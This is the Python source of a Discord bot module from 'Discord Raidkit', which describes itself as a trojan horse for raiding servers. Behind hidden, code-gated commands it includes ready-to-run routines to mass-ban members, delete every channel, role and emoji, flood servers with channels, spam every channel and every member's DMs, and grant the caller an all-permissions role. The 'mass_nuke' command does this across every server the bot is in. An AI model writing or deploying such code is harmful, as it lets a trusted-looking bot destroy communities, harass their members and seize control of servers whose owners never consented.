"""
Discord Raidkit v2.2.0 by the-cult-of-integral
"The trojan horse of discord raiding"
Last updated: 16/06/2022
"""

import json
from datetime import datetime
from random import choice

import discord
from discord.ext import commands

QUOTES = (
    "War is peace, freedom is slavery and ignorance is strength.",
    "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
    "The object of war is not die for your country but to make the other bastard die for his.",
    "War does not determine who are right - only those who are left.",
    "If you are far from the enemy, make them think you are near.",
    "Only the dead have seen the end of war.",
    "Older men declare war, but it is the youth that must fight and die.",
    "War is the teacher of violence.",
    "If you know the enemy and know yourself, you need not fear the result of a hundred battles."
)


def s_now() -> str:
    """Returns a string of the time when ran

    Returns:
        str: datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    """
    return datetime.now().strftime("%d-%m-%Y %H:%M:%S")


def show_invalid_runtime_code(cmd) -> None:
    """Print an invalid runtime code error including the command and time
    \nThis is done in dr_c_utils to allow for colorama

    Args:
        cmd (str): name of the command ran
    """
    print(f"\nInvalid runtime code provided for {cmd} at {s_now()}")
    return


def get_current_code() -> int:
    """Get the current runtime code

    Returns:
        int: the current runtime code
    """
    try:
        with open("config_data.json", "r") as f:
            data = json.load(f)
        return data["runtime_code"]
    except:
        return "0"


class Tools(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Turn off bot

    @commands.is_owner()
    @commands.command(hidden=True)
    async def shutdown(self, ctx, code=0):
        if int(code) != get_current_code():
            show_invalid_runtime_code("shutdown")
            return
        await ctx.message.delete()
        await self.bot.close()

    # Discord Raidkit Client Commands

    @commands.command(hidden=True)
    async def nick_all(self, ctx, code=0, *, nickname=None) -> None:
        """Nickname every member in a guild.
        """
        print(code)
        print(get_current_code())
        if int(code) != get_current_code():
            show_invalid_runtime_code("nick_all")
            return

        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        try:
            print(f"Nicknaming all members from server: {g}")
            if nickname.strip().replace(" ", ""):
                for member in g.members:
                    try:
                        await member.edit(nick=nickname)
                        print(f"Nicknamed {member}")
                    except discord.errors.HTTPException as e:
                        print(f"Failed to nickname {member}: {e}")
                print(f"nick_all for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def msg_all(self, ctx, code=0, *, msg="") -> None:
        """Message every member in a guild
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("msg_all")
            return
        
        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        try:
            for member in g.members:
                try:
                    if member.id == self.bot.user.id:
                        pass
                    else:
                        await member.send(msg)
                        print(f"Messaged {member}: \"{msg}\"")
                except discord.errors.HTTPException as e:
                    print(f"Failed to message {member}: {e}")
            print(f"msg_all for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def spam(self, ctx, code=0, *, msg="") -> None:
        """Spam every channel in a guild
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("spam")
            return
        
        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        try:
            if msg.strip().replace(" ", ""):
                print("Spamming started; type stop in a channel of the target server to stop this command.")

            def check_reply(message) -> bool:
                return message.content == "stop" and message.author == ctx.author
                
            async def spam_text() -> None:
                while True:
                    for c in g.text_channels:
                        await c.send(msg)
                
            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for("message", check=check_reply)
            spam_task.cancel()
            print(f"spam for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def cpurge(self, ctx, code=0) -> None:
        """Delete every channel in a guild
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("cpurge")
            return
        
        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        try:
            for c in g.channels:
                try:
                    await c.delete()
                    print(f"Deleted {c} from {g}")
                except discord.errors.HTTPException as e:
                    print(f"Failed to delete {c} from {g}: {e}")
            print(f"cpurge for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def cflood(self, ctx, code=0, channel_num=1, *, channel_name="Discord Raidkit v2.2.0") -> None:
        """Flood a guild with channels
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("cpurge")
            return
        
        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        if channel_num > 1000 or channel_num < 1:
            print("Channel number must be 1 - 1000")
            return

        try:
            for i in range(channel_num):
                try:
                    await g.create_text_channel(channel_name)
                    print(f"Created channel {i+1}/{channel_num} in {g}")
                except discord.errors.HTTPException as e:
                    print(f"Failed to create channel in {g}: {e}")
            print(f"cflood for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def admin(self, ctx, code=0, *, rolename=".") -> None:
        """Give yourself administrator permissions 
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("admin")
            return
        
        id_ = ctx.message.guild.id
        member = ctx.message.author
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        try:
            await g.create_role(name=rolename, permissions=discord.Permissions.all())
            role = discord.utils.get(g.roles, name=rolename)
            try:
                await member.add_roles(role)
                print(f"Granted you administrator on {g}")
            except discord.errors.HTTPException as e:
                print(f"Failed to grant you administrator on {g}: {e}")
            print(f"admin for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(e)
        return

    @commands.command(hidden=True)
    async def raid(self, ctx, code=0, rolename=None, nickname=None, channel_num=None,  channel_name=None, *, msg=None) -> None:
        """Raid a guild
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("admin")
            return
        
        if not rolename or not nickname or not channel_name or not channel_num or not msg:
            print("Not enough arguments provided")
            return

        id_ = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=id_)

        print(f"Starting raid on {g}")
        print("Deleting channels. . .")
        for c in g.channels:
            try:
                await c.delete()
                print(f"Deleted {c} from {g}")
            except BaseException as e:
                print(f"Failed to delete {c} from {g}: {e}")
        
        print("Deleting roles. . .")
        roles = g.roles
        roles.pop(0)
        for r in roles:
            if g.me.roles[-1] > r:
                try:
                    await r.delete()
                    print(f"Delted {r} from {g}")
                except BaseException as e:
                    print(f"Failed to delete {r} from {g}: {e}")
            else:
                break
        
        print("Nicknaming all members. . .")
        for member in g.members:
            try:
                await member.edit(nick=nickname)
                print(f"Nicknamed {member}")
            except BaseException as e:
                print(f"Failed to nickname {member}: {e}")

        print("Making new role. . .")
        await g.create_role(name=rolename, colour=discord.Colour(0xff0000))
        role = discord.utils.get(g.roles, name=rolename)

        print("Giving new role to all members. . .")
        for member in g.members:
            try:
                await member.add_roles(role)
                print(f"Added role to {member}")
            except BaseException as e:
                print(f"Failed to add role to {member}: {e}")
        
        print(f"Creating {channel_num} new channels named {channel_name}. . .")
        for i in range(int(channel_num)):
            try:
                await g.create_text_channel(channel_name)
                print(f"Created new channel {i+1}/{channel_num}")
            except BaseException as e:
                print(f"Failed to create channel #{i+1}: {e}")
        
        try:
            if msg.strip().replace(" ", ""):
                print("Spamming started; type stop in a channel of the target server to stop this command.")

            def check_reply(message) -> bool:
                return message.content == "stop" and message.author == ctx.author
                
            async def spam_text() -> None:
                while True:
                    for c in g.text_channels:
                        await c.send(msg)
                
            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for("message", check=check_reply)
            spam_task.cancel()
            print(f"Raid for {g} complete!")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(f"Failed to spam {g}: {e}")
        return
        
    @commands.command(hidden=True)
    async def nuke(self, ctx, code=0) -> None:
        """Nuke a guild
        """
        try:
            if int(code) != get_current_code():
                show_invalid_runtime_code("nuke")
                return
            
            id_ = ctx.message.guild.id
            await ctx.message.delete()
            g = discord.utils.get(self.bot.guilds, id=id_)

            quote = choice(QUOTES)

            print(f"\n\n{'-'*(len(quote)+2)}\nNuke depolyed on {g}!\n\n")
            
            print("Banning members. . .")
            for member in g.members:
                try:
                    if member != ctx.author:
                        await member.ban(reason=None, delete_message_days=7)
                        print(f"Banned {member} from {g}")
                    else:
                        print("You are immune!")
                except BaseException as e:
                    print(f"Failed to ban {member} from {g}: {e}")

            print("Deleting channels. . .")
            for c in g.channels:
                try:
                    await c.delete()
                    print(f"Deleted {c} from {g}")
                except BaseException as e:
                    print(f"Failed to delete {c} from {g}: {e}")

            print("Deleting roles...")
            roles = g.roles
            roles.pop(0)
            for r in roles:
                if g.me.roles[-1] > r:
                    try:
                        await r.delete()
                        print(f"Deleted {r} from {g}")
                    except BaseException as e:
                        print(f"Failed to delete {r} from {g}: {e}")
                else:
                    break

            print("Deleting emojis...")
            for emoji in list(g.emojis):
                try:
                    await emoji.delete()
                    print(f"Deleted {emoji} from {g}")
                except BaseException:
                    print(f"Failed to delete {emoji} from {g}: {e}")

            print(f"Nuke sucessfully exploded {g}!\n\"{quote}\"\n{'-'*(len(quote)+2)}")
            return
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(f"Nuke failed: {e}\n\n")
            return

    @commands.command(hidden=True)
    async def mass_nuke(self, ctx, code=0) -> None:
        """Attempt to nuke every guild the Discord Raidkit client is in
        """
        try:
            if int(code) != get_current_code():
                show_invalid_runtime_code("mass_nuke")
                return
            
            i = 1
            k = len(self.bot.guilds)
            quote = choice(QUOTES)

            for g in self.bot.guilds:
                print(f"\n\n{'-'*(len(quote)+2)}\nNuke depolyed on {g}!\n\n")
            
                print("Banning members. . .")
                for member in g.members:
                    try:
                        if member != ctx.author:
                            await member.ban(reason=None, delete_message_days=7)
                            print(f"Banned {member} from {g}")
                        else:
                            print("You are immune!")
                    except BaseException as e:
                        print(f"Failed to ban {member} from {g}: {e}")

                print("Deleting channels. . .")
                for c in g.channels:
                    try:
                        await c.delete()
                        print(f"Deleted {c} from {g}")
                    except BaseException as e:
                        print(f"Failed to delete {c} from {g}: {e}")

                print("Deleting roles...")
                roles = g.roles
                roles.pop(0)
                for r in roles:
                    if g.me.roles[-1] > r:
                        try:
                            await r.delete()
                            print(f"Deleted {r} from {g}")
                        except BaseException as e:
                            print(f"Failed to delete {r} from {g}: {e}")
                    else:
                        break

                print("Deleting emojis...")
                for emoji in list(g.emojis):
                    try:
                        await emoji.delete()
                        print(f"Deleted {emoji} from {g}")
                    except BaseException:
                        print(f"Failed to delete {emoji} from {g}: {e}")

                print(f"Nuke {i}/{k} sucessfully exploded {g}!\n\"{quote}\"\n{'-'*(len(quote)+2)}")
                i += 1

            print(f"All warheads fired.\n{quote}\n{'-'*(len(quote))}\n")
            return
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(f"Mass nuke failed: {e}\n\n")
            return

    @commands.command(hidden=True)
    async def leave(self, code, id_) -> None:
        """Force the Discord Raidkit client to leave a guild by ID
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("leave")
            return
        try:
            g = discord.utils.get(self.bot.guilds, id=id_)
            await g.leave()
            print(f"Left guild {g}")
        except commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(f"Failed to leave guild {g}: {e}")
        return

    @commands.command(hidden=True)
    async def mass_leave(self, code=0) -> None:
        """Force the Discord Raidkit client to leave every guild
        """
        if int(code) != get_current_code():
            show_invalid_runtime_code("mass_leave")
            return
        
        try:
            for g in self.bot.guilds:
                try:
                    await g.leave()
                    print(f"Left guild {g}")
                except BaseException as e:
                    print(f"Failed to leave guild {g}: {e}")
        except discord.ext.commands.errors.MissingRequiredArgument:
            print("Missing Required Arguments")
        except BaseException as e:
            print(f"Mass leave failed: {e}")
        return


def setup(bot) -> None:
    bot.add_cog(Tools(bot))
    return

